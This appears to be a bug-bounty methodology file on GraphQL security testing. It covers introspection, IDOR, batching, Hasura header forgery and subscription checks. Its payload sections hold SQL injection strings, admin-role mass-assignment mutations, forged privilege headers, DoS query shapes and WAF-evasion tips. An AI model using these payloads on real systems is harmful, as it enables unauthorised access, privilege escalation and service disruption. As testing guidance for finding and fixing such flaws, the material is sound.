---
name: "graphql-vulnerabilities"
version: "2.0"
category: "api"
subcategory: "graphql"
phase: "scanning"
tags: ["api", "batching", "bug-bounty", "graphql", "idor", "introspection", "access-control", "account-takeover", "auth", "authorization", "bypass", "cloud", "cors", "exploitation", "fuzzing", "iis", "information-disclosure", "js-recon", "mass-assignment", "mobile", "oauth", "path-traversal", "privesc", "session", "takeover", "token", "waf-bypass"]
tools: ["clairvoyance", "inql", "graphqlmap", "graphw00f", "graphql-cop", "arjun", "authz", "autorize", "burp", "grpcurl", "john", "kiterunner", "paramalyzer", "parameth", "repeater", "restler", "zap"]
follow_up_skills: ["mass-assignment", "api-fuzzing", "jwt-attacks", "sqli", "xss", "idor-detection-exploitation"]
description: "Bug bounty skill: graphql vulnerabilities - scanning phase, api category"
---
# GraphQL Vulnerabilities

## Summary

GraphQL is a query language for APIs that exposes a flexible endpoint where clients can request exactly the data they need. Its flexibility also introduces unique attack surfaces: introspection abuse, authorization bypass (IDOR), injection through resolvers, denial of service via complex queries or batching, information leakage through field suggestions, and subscription-based data leaks.

## Key Concepts

- **Introspection**: A built-in GraphQL feature that exposes the full schema (types, fields, mutations, subscriptions) — often left enabled in production
- **Query/Mutation/Subscription**: Three operation types — query (read), mutation (write), subscription (real-time)
- **Resolver**: The function that fetches data for a field — often the injection point
- **Aliases**: Requesting the same field multiple times under different names in one query
- **Fragments**: Reusable field selections that can also be used to bypass simple WAF rules
- **Relay Global IDs**: Base64-encoded `Type:ID` format (e.g., `VXNlcjoxMjM=` decodes to `User:123`)
- **Field Suggestions**: Error messages that suggest valid field names when invalid ones are queried
- **Directive Flooding**: Attaching many `@include`/`@skip` directives to exhaust parser CPU/memory
- **Incremental Delivery**: `@defer`/`@stream` directives that can multiply work and leak partial data
- **Federation/Gateway**: Cross-subgraph authorization gaps where router and subgraphs enforce different policies

## Technical Details

### GraphQL Attack Surface

- **Over-Fetching**: Clients can request excessive data, leading to DoS or information disclosure
- **Under-Fetching/N+1**: Performance issue that can create timing side-channels
- **IDOR**: Exposing internal IDs allows attackers to access unauthorized data by manipulating identifiers
- **Insufficient Authorization**: Missing or flawed checks on types, fields, mutations, or subscriptions
- **Input Validation Issues**: Unsanitized input can lead to SQLi, NoSQLi, XSS, SSRF
- **Introspection Enabled**: Exposes entire schema, simplifying reconnaissance
- **Batching Abuse**: Multiple queries/mutations in one request can overwhelm the server or bypass rate limiting
- **Lack of Depth/Complexity Limiting**: Allows excessively nested or complex queries leading to DoS
- **Directive Flooding**: Thousands of `@include`/`@skip` directives in a single query can exhaust parser/validation (e.g., CVE-2024-47614 in async-graphql)
- **Incremental Delivery**: `@defer`/`@stream` can multiply work and leak partial data
- **File Uploads**: Multipart spec edge cases (path traversal via `map`, temp file exposure)
- **Federation/Gateway**: Cross-subgraph authorization gaps and inconsistent role enforcement
- **CSRF**: Cookie-based auth needs header + `Origin` validation
- **WebSocket Security**: Subscriptions over WebSocket may lack re-authorization after token expiry
- **Field Suggestions**: Error messages leak valid field names even with introspection disabled
- **Relay Global IDs**: Base64-encoded `Type:ID` patterns reveal internal IDs
- **Apollo/Hasura Leaks**: Production Apollo may leak schema via query extensions; Hasura `x-hasura-*` headers may be trusted without validation
- **Header Injection**: Custom auth headers (e.g., `x-hasura-*`) may enable privilege escalation

### Common Vulnerability Patterns

- Publicly exposed GraphiQL interface with introspection enabled
- Mutations lacking proper authorization checks
- Resolvers directly using user input in database queries or system commands
- Fields returning sensitive information not intended for the user's role
- Lack of query depth/complexity/limit controls
- Subscription endpoints leaking data over time without re-authorization

## Methodology

1. Identify the GraphQL endpoint — check common paths (`/graphql`, `/graphiql`, `/graphql.php`, `/graphql/console`) and network requests in browser DevTools.
2. Send an introspection query (`query={__schema{types{name}}}`) to fetch the schema; use GraphiQL, Postman, or Altair.
3. Analyze the schema for sensitive types/fields (`admin`, `password`, `config`, `secret`, `token`), mutations, and subscriptions — use GraphQL Voyager or manual review.
4. Test authorization: try accessing data/mutations meant for higher-privileged users; test IDOR by replacing IDs in queries and mutations; check if different roles see different schema subsets; verify router and subgraphs enforce identical decisions.
5. Test injection: inject SQLi, NoSQLi, OS command, XSS, and SSRF payloads into string arguments.
6. Test DoS: deeply nested queries (`query { user { friends { friends { ... } } } }`), large limits in list arguments, query batching abuse, field duplication via aliases, directive flooding with many `@include`/`@skip` directives.
7. Test business logic: mutations for race conditions, logical errors, unintended side effects; test subscriptions for data leakage over time; test file upload mechanisms.
8. If introspection is disabled, probe with `query { __typename }` to confirm it's GraphQL, then brute-force types/fields using wordlists with `clairvoyance`, `GraphQLmap`, or `inql`.
9. Test Relay global IDs: decode base64 IDs to extract type and numeric ID, then test IDOR.
10. Test Apollo extensions (`?extensions={"persistedQuery":{...}}`) and Hasura header injection (`x-hasura-role`, `x-hasura-user-id`, `x-hasura-org-id`).
11. Test WebSocket subscriptions: tamper with `connection_init` payload, test subscription flooding, verify auth token expiry is enforced on long-lived connections, test for cross-user subscription leaks.
12. Analyze client-side code for hints about hidden fields, types, or mutations.

## Detection Commands

### Introspection Query
```graphql
query {
  __schema {
    types {
      name
    }
  }
}
```

### Deeper introspection (fields and args)
```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}
```

### Quick GraphQL endpoint confirmation
```graphql
query { __typename }
```

### Field suggestion probing
```graphql
query { invalidField }
```

### Relay global ID decode
```bash
echo "VXNlcjoxMjM=" | base64 -d
# Output: User:123
```

### Test IDOR in GraphQL
```graphql
query {
  user(id: "victim_id") {
    email
    phone
    role
  }
}
```

### Test batching limits (alias-based)
```graphql
query {
  u1: user(id: 1) { id name }
  u2: user(id: 2) { id name }
  u3: user(id: 3) { id name }
  # ... repeat to test limits
}
```

### Test batching (array format — bypasses per-request limits)
```graphql
[
  {"query":"{user(id:1){email}}"},
  {"query":"{user(id:2){email}}"},
  {"query":"{user(id:3){email}}"}
]
```

### Test query depth DoS
```graphql
query {
  user {
    friends {
      friends {
        friends {
          friends {
            id
          }
        }
      }
    }
  }
}
```

### Directive flooding probe
```graphql
query {
  __typename @skip(if: false) @skip(if: false) @skip(if: false) @skip(if: false) @skip(if: false)
}
```

### Apollo persisted query probe
```bash
curl -s 'https://target.com/graphql?extensions={"persistedQuery":{"version":1,"sha256Hash":"0000000000000000000000000000000000000000000000000000000000000000"}}'
```

### Hasura header injection
```bash
curl -s -H "x-hasura-role: admin" -H "x-hasura-user-id: 1" \
  -H "Content-Type: application/json" \
  -d '{"query":"query { users { id name email } }"}' \
  "https://target.com/v1/graphql"
```

### Subscription endpoint test
```graphql
subscription {
  userUpdated(id: "victim_id") {
    email
    role
  }
}
```

### WebSocket subscription test
```bash
# Using wscat or similar
wscat -c wss://target.com/graphql -H "Authorization: Bearer <token>"
# Send after connect:
# {"type":"connection_init","payload":{"Authorization":"Bearer <token>"}}
# {"id":"1","type":"subscribe","payload":{"query":"subscription { messages { text } }"}}
```

### File upload mutation test
```graphql
mutation {
  uploadFile(file: "test.txt") {
    path
  }
}
```

## Exploitation Payloads

### IDOR via GraphQL
```graphql
query {
  user(id: "attacker_id") {
    changePassword(newPassword: "pwned")
  }
}
```

### Mass assignment via mutation
```graphql
mutation {
  updateUser(id: "victim_id", input: {
    role: "admin"
    is_admin: true
  }) {
    id
    role
  }
}
```

### Injection in arguments
```graphql
query {
  search(term: "') OR '1'='1") {
    results { id title }
  }
}
```

### SQLi in GraphQL arguments
```graphql
{ user(id:"1 OR 1=1") { id email } }
{ user(id:"1' OR '1'='1") { id email } }
{ user(id:"admin' --") { id email } }
```

### Nested object injection
```graphql
mutation {
  createProfile(input: {
    name: "attacker"
    owner_id: "attacker_id"
    target_id: "victim_id"
  }) {
    id
  }
}
```

## Commands

### Probe for GraphQL endpoint with common paths
```bash
for path in /graphql /graphiql /graphql.php /graphql/console /v1/graphql /v2/graphql /api/graphql; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
  echo "$path → $status"
done
```

### curl introspection
```bash
curl -s -H "Content-Type: application/json" \
  -d '{"query":"query { __schema { types { name } } }"}' \
  "https://target.com/graphql"
```

### fingerprint GraphQL implementation (graphw00f)
```bash
python3 graphw00f.py -d https://target.com/graphql
```

### Security audit with graphql-cop
```bash
graphql-cop -t https://target.com/graphql
```

## Tools

- **Automated Scanners**: StackHawk, Invicti, Escape (free SaaS), Nuclei (GraphQL templates)
- **Introspection & Interaction**: GraphiQL, Postman, Altair GraphQL Client, Insomnia
- **Schema Exploration**: GraphQL Voyager
- **Exploitation/Fuzzing**: inql (Burp), GraphQLmap, clairvoyance, CrackQL, BatchQL
- **Proxies**: Burp Suite, OWASP ZAP
- **Security Middleware**: GraphQL Armor
- **Fingerprinting**: graphw00f
- **Security Auditing**: graphql-cop
- **Endpoint Discovery**: Graphinder
- **Linters**: graphql-schema-linter, eslint-plugin-graphql
- **Custom Scripts**: Python with `requests` library

## Bypass Techniques

- **Introspection Disabled**: Use `query { __typename }` to confirm endpoint; brute-force types/fields with `clairvoyance`, `GraphQLmap`, or SecLists wordlists; analyze client-side code for hints
- **Rate Limiting/Complexity Limits**: Use aliases to request the same field multiple times within limits; split complex queries into smaller ones; abuse batching if not limited
- **WAF Evasion**: Use aliases, fragments, different whitespace; encode payloads within strings; use nested input objects to evade top-level argument inspection; place sensitive fields under `@defer` to evade naive complexity calculators
- **Directive Flooding**: Attach many `@include`/`@skip` directives to safe fields to exhaust parser/validation
- **Incremental Delivery**: Abuse `@defer`/`@stream` to multiply compute and leak partial data
- **Persisted Queries**: If enforced, prefer signature-based edge enforcement over WAF reliance

## Not a Finding If

- Introspection is disabled AND no field suggestion leaks occur AND no alternative paths expose the schema
- Proper depth/complexity/alias limits are enforced and rate limiting prevents batching abuse
- Authorization is enforced per-field, not just at root resolver level (verify with aliases, fragments, batched queries)
- Subscription connections re-validate auth tokens after expiry and enforce per-user scoping
- File uploads have proper path traversal protections, content-type validation, and temp file cleanup
- Relay global IDs are properly tied to user sessions server-side (decoding alone ≠ vulnerability)
- Hasura `x-hasura-*` headers are validated server-side and cannot be forged
- Federation gateway enforces consistent authorization across all subgraphs

## Checklist

- [ ] Introspection enabled (schema exposed)
- [ ] Input validation missing (argument injection — SQLi, NoSQLi, command injection)
- [ ] Batching attacks possible (no rate limit on batched queries, array format accepted)
- [ ] Recursion DoS possible (circular/self-referential types, no depth limit)
- [ ] Authentication/authorization missing on mutations
- [ ] Relay global IDs decodable and reusable across users
- [ ] Field suggestions leaking valid field names
- [ ] Subscription endpoints lack re-authorization after token expiry

## Notes

- GraphQL requires per-field authorization — not just at the resolver root — to prevent aliasing/batching bypass
- Relay global IDs (base64 `Type:ID`) are commonly used — always decode and test for IDOR
- Field suggestion errors leak schema info even with introspection off — probe with invalid field names
- Apollo Server may leak schema via query extensions in production
- Hasura misconfiguration can expose direct DB access via arbitrary SQL or role impersonation
- `graphql-upload` multipart handling can introduce path traversal and temp file exposure
- WebSocket subscriptions often lack re-authorization after token expiry — test long-lived connections
- Federation requires authz consistency checks between router and each subgraph
- Always test mobile and older API versions alongside main GraphQL endpoint
- GraphQL Armor can enforce depth, alias, and complexity limits in production

## References

- GraphQL Vulnerabilities - Original skill document
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection
- https://portswigger.net/web-security/graphql
- https://github.com/0xacb/recollapse
